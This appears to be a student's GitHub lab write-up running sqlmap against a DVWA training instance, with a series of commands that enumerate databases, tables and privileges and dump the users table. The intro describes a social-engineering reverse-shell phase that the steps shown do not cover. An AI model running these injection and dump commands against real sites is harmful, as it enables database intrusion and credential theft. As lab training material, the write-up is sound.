# Hacking-a-SQL-database

<h1>Phase 6</h1>

Structureality is concerned about their susceptibility to soical engineering attacks and have given approval to test their personnel. I will perform a simulated social engineering attack against their employee using the Social Engineering Toolkit (SET). The goal is to trick a victim into running a malicious payload which will result in a reverse shell being established between the victim and the attacker systems.

**<p style="font-size: 15px;">Step 1: Use SQLMAP to Hack a Database.</p>**

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/0e947fc3-fdfb-411d-94d9-fc5a8c4bb8d3)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/518e491c-323a-46a3-aa3d-064096cf94cc)

http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Sumbit#

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/571ee018-082e-4ec6-950c-d46c22ddadf6)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/6ca88886-97c0-4483-a0de-d92e5196c681)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -b

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/94178e4f-61c9-45e5-a2f8-7e8035d4e460)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/86db4444-3ff1-4d4e-ac40-bddba9bbdd5f)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --dbs

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/ec943912-4e45-49aa-add6-5046d2755a56)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/58bcf6dd-7fb7-4681-b404-15f0f518277b)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -D dvwa --tables

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/a2c2528f-10a7-44e7-b62a-41ad2fe0210a)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/127762ab-16fc-44ca-bac9-d8196bfdbd8b)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -D dvwa -T users --columns

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/372092ec-e998-4701-b5c9-ec73ddd48791)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/e7b7d9da-1242-4681-92a9-051dc66cc9e5)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -D dvwa -T users --dump

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/b365aada-3774-42c7-8a49-52f422fd4d60)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/dfa4b8d8-16e3-438f-89ba-ee19279ff46f)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/a4a0c3c0-175e-47b1-b2d8-c2e0b68189cf)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --hostname

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/31510a64-d852-4663-bdc2-3578d678c9b8)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/de705765-6ad0-4259-8c3e-9e2ecfb1b96f)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --current-user

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/8f3d546b-21ba-4ace-881b-5ee2ca9b6071)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/30eee76f-dd30-4f3e-90e5-d5e31233c74b)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --current-db

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/c7164227-f46a-4082-ab2f-e6a60bc058ce)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/0c7df860-8454-44d6-b801-0b203c16777f)

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --privileges --roles --is-dba

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/f1d7b932-0c0f-46a4-bee2-ba09b0d00bb8)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/d01914a3-bedc-4575-a7a8-0a9ae956ddd9)
































